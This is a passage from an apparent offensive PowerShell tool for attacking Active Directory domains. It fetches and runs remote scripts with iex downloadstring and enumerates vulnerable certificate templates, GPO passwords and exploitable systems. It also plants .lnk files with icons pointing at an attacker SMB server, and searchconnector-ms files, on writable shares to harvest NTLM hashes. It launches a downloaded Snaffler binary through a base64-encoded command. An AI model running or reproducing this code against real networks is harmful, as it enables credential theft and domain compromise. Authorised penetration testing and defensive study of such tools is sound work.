	if ($NoVulnCertTemplates -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning)
	{
		Write-Host "Skipping Misconfigured Templates enumeration..." -ForegroundColor Yellow;
	}
	else{
		iex(new-object net.webclient).downloadstring("$ServerURL/Invoke-Certify.ps1")
		
		if($Domain){
			echo ""
			Write-Host "Serching for Misconfigured Certificate Templates... " -ForegroundColor Cyan
			
			Invoke-Certify find /vulnerable /domain:$Domain > $ToolOutput\$Domain\Vulnerable_Templates.txt
			type $ToolOutput\$Domain\Vulnerable_Templates.txt
			Write-Host "Done! " -ForegroundColor Green;
			echo " "
		}
		
		else{
			echo ""
			Write-Host "Checking Misconfigured Certificate Templates for all domains... " -ForegroundColor Cyan
			foreach($AllDomain in $AllDomains){
				Invoke-Certify find /vulnerable /domain:$AllDomain > $ToolOutput\$AllDomain\Vulnerable_Templates.txt
				type $ToolOutput\$AllDomain\Vulnerable_Templates.txt
			}
		}
	}
	
	### AV Flag

	if($NoVulnGPOs -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning){Write-Host "Skipping GPO enumeration..." -ForegroundColor Yellow;}
	else{
		
		iex(new-object net.webclient).downloadstring("$ServerURL/Invoke-Grouper3.ps1")
		
		if($Domain){
			echo " "
			Write-Host "Enumerating GPOs... " -ForegroundColor Cyan
			Invoke-Grouper3 -d $Domain -c (Get-DomainController -Domain $Domain | Where-Object { $_.Roles -like "*RidRole*" }).Name -f $ToolOutput\$Domain\GPOs_Vulnerable.txt
		}
		
		else{
			echo " "
			Write-Host "Enumerating GPOs for all domains... " -ForegroundColor Cyan
			foreach($AllDomain in $AllDomains){
				Invoke-Grouper3 -d $AllDomain -c (Get-DomainController -Domain $AllDomain | Where-Object { $_.Roles -like "*RidRole*" }).Name -f $ToolOutput\$AllDomain\GPOs_Vulnerable.txt
			}
		}
		
		Write-Host "Done! " -ForegroundColor Green;
		echo " "
	}


	if ($NoExploitableSystems -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning)
	{
		Write-Host "Skipping Exploitable Systems..." -ForegroundColor Yellow;
	}
	else{
		iex(new-object net.webclient).downloadstring("$ServerURL/Get-ExploitableSystems.psm1")
		
		if($Domain){
			echo ""
			Write-Host "Looking for Exploitable Systems... " -ForegroundColor Cyan;
			Get-ExploitableSystems -DomainController $Domain | Format-Table -AutoSize > $ToolOutput\$Domain\ExploitableSystems.txt
			type $ToolOutput\$Domain\ExploitableSystems.txt
		}
		
		else{
			echo ""
			Write-Host "Looking for Exploitable Systems on all domains... " -ForegroundColor Cyan;
			foreach($AllDomain in $AllDomains){
				Get-ExploitableSystems -DomainController $AllDomain | Format-Table -AutoSize > $ToolOutput\$AllDomain\ExploitableSystems.txt
				type $ToolOutput\$AllDomain\ExploitableSystems.txt
			}
		}
		
		Write-Host "Done! " -ForegroundColor Green;
		echo " "
	}
	
	### AV Flag

	if ($NoLDAPS -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning)
	{
		Write-Host "Skipping LDAP Signing Enumeration..." -ForegroundColor Yellow;
	}
	else{
		echo ""
		Write-Host "Enumerating LDAP Signing... " -ForegroundColor Cyan;
		Write-Host "If set to not-required you can elevate to SYSTEM via KrbRelayUp exploit!" -ForegroundColor Yellow;
		iex(new-object net.webclient).downloadstring("$ServerURL/Invoke-LdapSignCheck.ps1")
		Invoke-LdapSignCheck -Command "" > $ToolOutput\LDAPS.txt
		type $ToolOutput\LDAPS.txt
		Write-Host "Done! " -ForegroundColor Green;
		echo " "
	}

	if($NoLAPS -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning){}
	else{
		Write-Host "Checking for Local Admin Password Solution (LAPS)..." -ForegroundColor Cyan;
		try{
			$lapsfile = Get-ChildItem "$env:ProgramFiles\LAPS\CSE\Admpwd.dll" -ErrorAction Stop
			if ($lapsfile){
				Write-Output "The LAPS DLL (Admpwd.dll) was found. Local Admin password randomization may be in use."
				Write-Output "The LAPS DLL (Admpwd.dll) was found. Local Admin password randomization may be in use." > $ToolOutput\LAPS.txt
			}
		}
		catch{
			Write-Output "The LAPS DLL was not found. Local Admin password randomization may not be in use."
			Write-Output "The LAPS DLL was not found. Local Admin password randomization may not be in use." > $ToolOutput\LAPS.txt
		}
		Write-Output "`n"
	}
	
	### AV Flag

	if ($NoGPOPass -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning)
	{
		Write-Host "Skipping GPP passwords..." -ForegroundColor Yellow;
	}
	else{
		echo ""
		Write-Host "Search for passwords in GPO... " -ForegroundColor Cyan;
		iex(new-object net.webclient).downloadstring("$ServerURL/Get-GPPPassword.ps1")
		
		if($Domain){
			Get-GPPPassword -Server (Get-DomainController -Domain $Domain | Where-Object { $_.Roles -like "*RidRole*" }).Name > $ToolOutput\$Domain\GPP-Passwords.txt
			type $ToolOutput\$Domain\GPP-Passwords.txt
		}
		
		else{
			foreach($AllDomain in $AllDomains){
				Get-GPPPassword -Server (Get-DomainController -Domain $AllDomain | Where-Object { $_.Roles -like "*RidRole*" }).Name > $ToolOutput\$AllDomain\GPP-Passwords.txt
				type $ToolOutput\$AllDomain\GPP-Passwords.txt
			}
		}
		
		Write-Host "Done! " -ForegroundColor Green;
		echo " "
	}
	
	### AV Flag

	
	if($NoRWShares -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning) {Write-Host "Skipping R\W Shares Enumeration..." -ForegroundColor Yellow;}

	else{

		echo ""
		Write-Host "Checking for accessible shares... " -ForegroundColor Cyan;
		if($NoPingCastle){
			if(Test-Path -Path $ToolOutput\PingCastle\PingCastle.exe){}
			else{
				Invoke-WebRequest -Uri $jpingdownload -OutFile "$ToolOutput\PingCastle.zip"

				Add-Type -AssemblyName System.IO.Compression.FileSystem
				function Unzip
				{
						param([string]$zipfile, [string]$outpath)

						[System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
				}

				Unzip "$ToolOutput\PingCastle.zip" "$ToolOutput\PingCastle\"
			}
		}

		if($Domain){
			cd $ToolOutput\$Domain
			.$ToolOutput\PingCastle\PingCastle.exe --scanner share --scmode-all --server $currentDomain
			$jpingshares = get-content $ToolOutput\$Domain\ad_scanner_share* | Select-String -pattern "True" | foreach {"\\" + $_ }
			$jpingshares = $jpingshares -replace "True",""
			$jpingshares = $jpingshares -replace "False",""
			$jpingshares = $jpingshares.Trim()
			$jpingshares = $jpingshares -replace "\s","\"
			$jpingshares > $ToolOutput\$Domain\Shares_Accessible.txt
			type $ToolOutput\$Domain\Shares_Accessible.txt
			del $ToolOutput\$Domain\ad_scanner_share*
		}
		
		else{
			foreach($AllDomain in $AllDomains){
				cd $ToolOutput\$AllDomain
				.$ToolOutput\PingCastle\PingCastle.exe --scanner share --scmode-all --server $AllDomain
				$jpingshares = get-content $ToolOutput\$AllDomain\ad_scanner_share* | Select-String -pattern "True" | foreach {"\\" + $_ }
				$jpingshares = $jpingshares -replace "True",""
				$jpingshares = $jpingshares -replace "False",""
				$jpingshares = $jpingshares.Trim()
				$jpingshares = $jpingshares -replace "\s","\"
				$jpingshares > $ToolOutput\$AllDomain\Shares_Accessible.txt
				type $ToolOutput\$AllDomain\Shares_Accessible.txt
				del $ToolOutput\$AllDomain\ad_scanner_share*
			}
		}

		echo ""
		Write-Host "Checking for writable shares..." -ForegroundColor Cyan;
		
		function Test-Write {
					[CmdletBinding()]
					param (
							[parameter()] [ValidateScript({[IO.Directory]::Exists($_.FullName)})]
							[IO.DirectoryInfo] $Path
					)
					try {
							$testPath = Join-Path $Path ([IO.Path]::GetRandomFileName())
							[IO.File]::Create($testPath, 1, 'DeleteOnClose') > $null
							return "$Path"
					} finally {
							Remove-Item $testPath -ErrorAction SilentlyContinue
					}
		}
		
		if($Domain){
			Get-Content $ToolOutput\$Domain\Shares_Accessible.txt | ForEach-Object {Test-Write $_ -ea silentlycontinue >> $ToolOutput\$Domain\Shares_Writable_Temp.txt}
			type $ToolOutput\$Domain\Shares_Writable_Temp.txt | Get-Unique > $ToolOutput\$Domain\Shares_Writable.txt
			del $ToolOutput\$Domain\Shares_Writable_Temp.txt
			type $ToolOutput\$Domain\Shares_Writable.txt
		}
		
		else{
			foreach($AllDomain in $AllDomains){
				Get-Content $ToolOutput\$AllDomain\Shares_Accessible.txt | ForEach-Object {Test-Write $_ -ea silentlycontinue >> $ToolOutput\$AllDomain\Shares_Writable_Temp.txt}
				type $ToolOutput\$AllDomain\Shares_Writable_Temp.txt | Get-Unique > $ToolOutput\$AllDomain\Shares_Writable.txt
				del $ToolOutput\$AllDomain\Shares_Writable_Temp.txt
				type $ToolOutput\$AllDomain\Shares_Writable.txt
			}
		}
		
		echo ""
		Write-Host "Done! " -ForegroundColor Green;
	}


	if($URLFileAttack -OR $OnlyURLFileAttack){
		
		echo ""
		Write-Host "URL File Attack in progress..." -ForegroundColor Cyan;
		Write-Host "Don't forget to clean after yourself once you are done with this attack..." -ForegroundColor Red;
		
		if($URLAttackFileName) {}
		else {$URLAttackFileName = "Financial"}
		
		if($Domain){
			if($SharesWritable){$jtestwritableshares = Get-Content $SharesWritable}
			else{$jtestwritableshares = Get-Content $ToolOutput\$Domain\Shares_Writable.txt}
			if($jtestwritableshares){
				$jwsh = new-object -ComObject wscript.shell
				$jshortcut = $jwsh.CreateShortcut("$ToolOutput\$Domain\@$URLAttackFileName.lnk")
				$jshortcut.IconLocation = "\\$SMBServerIP\test.ico"
				$jshortcut.Save()
				$jtestwritableshares | ForEach-Object {cp $ToolOutput\$Domain\@$URLAttackFileName.lnk $_\@$URLAttackFileName.lnk}
				del $ToolOutput\$Domain\@$URLAttackFileName.lnk
			}
			else{
				if($SharesWritable){Write-Host "No writable shares listed within $SharesWritable" -ForegroundColor Red}
				else{Write-Host "No writable shares listed within $ToolOutput\$Domain\Shares_Writable.txt" -ForegroundColor Red}
				Write-Host "Skipping URL File attack..." -ForegroundColor Yellow;
			}
		}
		
		else{
			if($SharesWritable){
				$jtestwritableshares = Get-Content $SharesWritable
				if($jtestwritableshares){
					$jwsh = new-object -ComObject wscript.shell
					$jshortcut = $jwsh.CreateShortcut("$ToolOutput\ @$URLAttackFileName.lnk")
					$jshortcut.IconLocation = "\\$SMBServerIP\test.ico"
					$jshortcut.Save()
					$jtestwritableshares | ForEach-Object {cp $ToolOutput\@$URLAttackFileName.lnk $_\@$URLAttackFileName.lnk}
					del $ToolOutput\@$URLAttackFileName.lnk
				}
				else{
					Write-Host "No writable shares listed within $SharesWritable" -ForegroundColor Red
					Write-Host "Skipping URL File attack..." -ForegroundColor Yellow
				}
			}
			
			else{
				foreach($AllDomain in $AllDomains){
					$jtestwritableshares = $null
					$jtestwritableshares = Get-Content $ToolOutput\$AllDomain\Shares_Writable.txt
					if($jtestwritableshares){
						$jwsh = new-object -ComObject wscript.shell
						$jshortcut = $jwsh.CreateShortcut("$ToolOutput\$AllDomain\@$URLAttackFileName.lnk")
						$jshortcut.IconLocation = "\\$SMBServerIP\test.ico"
						$jshortcut.Save()
						$jtestwritableshares | ForEach-Object {cp $ToolOutput\$AllDomain\@$URLAttackFileName.lnk $_\@$URLAttackFileName.lnk}
						del $ToolOutput\$AllDomain\@$URLAttackFileName.lnk
					}
					else{
						Write-Host "No writable shares listed within $ToolOutput\$AllDomain\Shares_Writable.txt" -ForegroundColor Red;
						Write-Host "Skipping URL File attack for domain $AllDomain..." -ForegroundColor Yellow;
					}
				}
			}
		}
		
		Write-Host "Done!" -ForegroundColor Green;
		echo " "
	}
	
	elseif(!$URLFileAttack -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning) {
		Write-Host "Skipping URL File attack..." -ForegroundColor Yellow;
	}
	
	if($URLFileClean -OR $OnlyURLFileClean){
		
		echo ""
		Write-Host "Cleaning after a previous URL File attack..." -ForegroundColor Cyan;
		
		if($URLAttackFileName) {}
		else {$URLAttackFileName = "Financial"}
		
		if($Domain){
			if($SharesWritable){$jtestwritableshares = Get-Content $SharesWritable}
			else{$jtestwritableshares = Get-Content $ToolOutput\$Domain\Shares_Writable.txt}
			if($jtestwritableshares){
				$jtestwritableshares | ForEach-Object {del $_\@$URLAttackFileName.lnk}
			}
			else{
				if($SharesWritable){Write-Host "No writable shares listed within $SharesWritable" -ForegroundColor Red}
				else{Write-Host "No writable shares listed within $ToolOutput\$Domain\Shares_Writable.txt" -ForegroundColor Red}
				Write-Host "Skipping URL File attack cleaning..." -ForegroundColor Yellow;
			}
		}
		
		else{
			foreach($AllDomain in $AllDomains){
				$jtestwritableshares = $null
				$jtestwritableshares = Get-Content $ToolOutput\$AllDomain\Shares_Writable.txt
				if($jtestwritableshares){
					$jtestwritableshares | ForEach-Object {del $_\@$URLAttackFileName.lnk}
				}
				else{
					Write-Host "No writable shares listed within $ToolOutput\$AllDomain\Shares_Writable.txt" -ForegroundColor Red;
					Write-Host "Skipping URL File attack cleaning for domain $AllDomain..." -ForegroundColor Yellow;
				}
			}
		}
		
		Write-Host "Done!" -ForegroundColor Green;
		
	}
	
	elseif(!$URLFileClean -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning) {Write-Host "Skipping URL File attack cleaning..." -ForegroundColor Yellow}
	
	if($NoSpool -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning){Write-Host "Skipping Spool Service Checking..." -ForegroundColor Yellow}
	else{
		
		iex(new-object net.webclient).downloadstring("$ServerURL/Get-SpoolStatus.ps1")
		
		echo ""
		Write-Host "Checking for Spool Status Enabled on Servers..." -ForegroundColor Cyan;
		
		if($Domain){
			$AllMachines = $null
			$AllMachines = (Get-DomainComputer -Domain $Domain -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE | select dnshostname); ForEach($Machine in $AllMachines){Get-SpoolStatus $Machine.dnshostname | Where {$_ -like "*True*"} | ForEach-Object {$_ -replace " True", ""}}
			$AllMachines | Select-Object -ExpandProperty dnshostname | Out-File "$ToolOutput\$Domain\Spool_Status_Enabled.txt"
		}
		
		else{
			foreach($AllDomain in $AllDomains){
				$AllMachines = $null
				$AllMachines = (Get-DomainComputer -Domain $AllDomain -OperatingSystem "*Server*" -UACFilter NOT_ACCOUNTDISABLE | select dnshostname); ForEach($Machine in $AllMachines){Get-SpoolStatus $Machine.dnshostname | Where {$_ -like "*True*"} | ForEach-Object {$_ -replace " True", ""}}
				$AllMachines | Select-Object -ExpandProperty dnshostname | Out-File "$ToolOutput\$AllDomain\Spool_Status_Enabled.txt"
			}
		}
		
		Write-Host "Done!" -ForegroundColor Green;
		echo " "
	}
	
	if($NoWebDAV -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning){Write-Host "Skipping WebDAV Checking..." -ForegroundColor Yellow}
	else{
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/CheckWebDAVStatus/main/CheckWebDAVStatus.ps1')
		
		echo ""
		Write-Host "Checking for WebDAV Status Enabled..." -ForegroundColor Cyan;
		
		if($Domain){
			CheckWebDAVStatus -Domain $Domain -OutputFile "$ToolOutput\$Domain\WebDAVStatusEnabled.txt"
		}
		
		else{
			foreach($AllDomain in $AllDomains){
				CheckWebDAVStatus -Domain $AllDomain -OutputFile "$ToolOutput\$AllDomain\WebDAVStatusEnabled.txt"
			}
		}
		
		Write-Host "Done!" -ForegroundColor Green;
		echo " "
	}
	
	if($WebDAVEnable -OR $OnlyWebDAVEnable){
		
		echo ""
		Write-Host "WebDAV file attack in progress..." -ForegroundColor Cyan;
		
		$WebDavFile = @"
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://whatever/</url>
    </simpleLocation>
</searchConnectorDescription>
"@
		$WebDavFileName = "about.searchconnector-ms"
		
		if($Domain){
			if($SharesWritable){$jtestwritableshares = Get-Content $SharesWritable}
			else{$jtestwritableshares = Get-Content $ToolOutput\$Domain\Shares_Writable.txt}
			if($jtestwritableshares){
				$LocalFilePath = Join-Path $ToolOutput\$Domain $WebDavFileName
				$WebDavFileContent | Out-File -Path $LocalFilePath
				$jtestwritableshares | ForEach-Object {$destination = Join-Path $_ $WebDavFileName; Copy-Item -Path $LocalFilePath -Destination $destination}
				del $ToolOutput\$Domain\$WebDavFileName
			}
			else{
				if($SharesWritable){Write-Host "No writable shares listed within $SharesWritable" -ForegroundColor Red}
				else{Write-Host "No writable shares listed within $ToolOutput\$Domain\Shares_Writable.txt" -ForegroundColor Red}
				Write-Host "Skipping WebDAV attack..." -ForegroundColor Yellow;
			}
		}
		
		else{
			if($SharesWritable){
				$jtestwritableshares = Get-Content $SharesWritable
				if($jtestwritableshares){
					$WebDavFileContent | Out-File $ToolOutput\$WebDavFileName
					$jtestwritableshares | ForEach-Object {cp $ToolOutput\$WebDavFileName $_\$WebDavFileName}
					del $ToolOutput\$WebDavFileName
				}
				else{
					Write-Host "No writable shares listed within $SharesWritable" -ForegroundColor Red
					Write-Host "Skipping WebDAV attack..." -ForegroundColor Yellow
				}
			}
			
			else{
				foreach($AllDomain in $AllDomains){
					$jtestwritableshares = $null
					$jtestwritableshares = Get-Content $ToolOutput\$AllDomain\Shares_Writable.txt
					if($jtestwritableshares){
						$WebDavFileContent | Out-File $ToolOutput\$AllDomain\$WebDavFileName
						$jtestwritableshares | ForEach-Object {cp $ToolOutput\$AllDomain\$WebDavFileName $_\$WebDavFileName}
						del $ToolOutput\$AllDomain\$WebDavFileName
					}
					else{
						Write-Host "No writable shares listed within $ToolOutput\$AllDomain\Shares_Writable.txt" -ForegroundColor Red;
						Write-Host "Skipping URL File attack for domain $AllDomain..." -ForegroundColor Yellow;
					}
				}
			}
		}
		
		Write-Host "Done!" -ForegroundColor Green;
		echo " "
	}
	
	if($WebDAVDisable -OR $OnlyWebDAVDisable){
		if($Domain){
			if($SharesWritable){$jtestwritableshares = Get-Content $SharesWritable}
			else{$jtestwritableshares = Get-Content $ToolOutput\$Domain\Shares_Writable.txt}
			if($jtestwritableshares){
				echo ""
				Write-Host "WebDAV file removal in progress..." -ForegroundColor Cyan;
				$FileNameToDelete = "about.searchconnector-ms"
				$jtestwritableshares | ForEach-Object {
					$fullFilePath = Join-Path $_ $FileNameToDelete
					if (Test-Path $fullFilePath) {
						Remove-Item -Path $fullFilePath -Force
					}
				}
				Write-Host "Done!" -ForegroundColor Green;
				echo " "
			}
			else{
				if($SharesWritable){Write-Host "No writable shares listed within $SharesWritable" -ForegroundColor Red}
				else{Write-Host "No writable shares listed within $ToolOutput\$Domain\Shares_Writable.txt" -ForegroundColor Red}
				Write-Host "Skipping WebDAV file removal..." -ForegroundColor Yellow;
			}
		}
		
		else{
			if($SharesWritable){
				$jtestwritableshares = Get-Content $SharesWritable
				if($jtestwritableshares){
					echo ""
					Write-Host "WebDAV file removal in progress..." -ForegroundColor Cyan;
					$FileNameToDelete = "about.searchconnector-ms"
					$jtestwritableshares | ForEach-Object {
						$fullFilePath = Join-Path $_ $FileNameToDelete
						if (Test-Path $fullFilePath) {
							Remove-Item -Path $fullFilePath -Force
						}
					}
					Write-Host "Done!" -ForegroundColor Green;
					echo " "
				}
				else{
					Write-Host "No writable shares listed within $SharesWritable" -ForegroundColor Red
					Write-Host "Skipping WebDAV file removal..." -ForegroundColor Yellow
				}
			}
			
			else{
				foreach($AllDomain in $AllDomains){
					$jtestwritableshares = $null
					$jtestwritableshares = Get-Content $ToolOutput\$AllDomain\Shares_Writable.txt
					if($jtestwritableshares){
						echo ""
						Write-Host "WebDAV file removal in progress..." -ForegroundColor Cyan;
						$FileNameToDelete = "about.searchconnector-ms"
						$jtestwritableshares | ForEach-Object {
							$fullFilePath = Join-Path $_ $FileNameToDelete
							if (Test-Path $fullFilePath) {
								Remove-Item -Path $fullFilePath -Force
							}
						}
						Write-Host "Done!" -ForegroundColor Green;
						echo " "
					}
					else{
						Write-Host "No writable shares listed within $ToolOutput\$AllDomain\Shares_Writable.txt" -ForegroundColor Red;
						Write-Host "Skipping WebDAV file removal for domain $AllDomain..." -ForegroundColor Yellow;
					}
				}
			}
			
			Write-Host "Done!" -ForegroundColor Green;
			echo " "
		}
	}
	
	if($NoSMBSigning -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyShares -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable){Write-Host "Skipping SMB-Signing Checking..." -ForegroundColor Yellow}
	else{
		iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/CheckSMBSigning/main/CheckSMBSigning.ps1')
		
		echo ""
		Write-Host "Checking for SMB-Signing..." -ForegroundColor Cyan;
		
		if($Domain){
			CheckSMBSigning -Domain $Domain -OutputFile "$ToolOutput\$Domain\SMBSigningNotRequired.txt"
		}
		
		else{
			foreach($AllDomain in $AllDomains){
				CheckSMBSigning -Domain $AllDomain -OutputFile "$ToolOutput\$AllDomain\SMBSigningNotRequired.txt"
			}
		}
		
		Write-Host "Done!" -ForegroundColor Green;
		echo " "
	}
	
	if($NoShares -OR $OnlyPingCastle -OR $OnlyEnum -OR $OnlyBloodHound -OR $OnlyKerberoasting -OR $OnlyTGTs -OR $OnlyVulnCertTemplates -OR $OnlyVulnGPOs -OR $OnlyExploitableSystems -OR $OnlyLDAPS -OR $OnlyLAPS -OR $OnlyGPOPass -OR $OnlyRWShares -OR $OnlyURLFileAttack -OR $OnlyURLFileClean -OR $OnlySpool -OR $OnlyWebDAV -OR $OnlyWebDAVEnable -OR $OnlyWebDAVDisable -OR $OnlySMBSigning){Write-Host "Skipping Shares Checking..." -ForegroundColor Yellow}
	else{
		echo ""
		Write-Host "Checking for interesting files within Shares..." -ForegroundColor Cyan;
		if(Test-Path -Path $ToolOutput\Tools\SnaffPro.exe){}
		else{Invoke-WebRequest -Uri "$ServerURL/Snaffler_protected.exe" -OutFile "$ToolOutput\Tools\SnaffPro.exe"}
		if($Domain){
  			$TargetServer = Get-DomainController -Domain $Domain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
			$command = "$ToolOutput\Tools\SnaffPro.exe -u -s -d $Domain -c $TargetServer -o $ToolOutput\$Domain\Shares_Findings.txt"
			$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
			Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -EncodedCommand $encodedCommand"
		}
		else{
			foreach($AllDomain in $AllDomains){
   				$TargetServer = $null
       				$TargetServer = Get-DomainController -Domain $AllDomain | Where-Object {$_.Roles -like "RidRole"} | Select-Object -ExpandProperty Name
				$command = "$ToolOutput\Tools\SnaffPro.exe -u -s -d $AllDomain -c $TargetServer -o $ToolOutput\$AllDomain\Shares_Findings.txt"
				$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
				Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -EncodedCommand $encodedCommand"
			}
		}
	}
	
	cd $tempdirectory

	echo " "
	Write-Host "Arrivederci !!" -ForegroundColor Cyan;
	echo " "

}
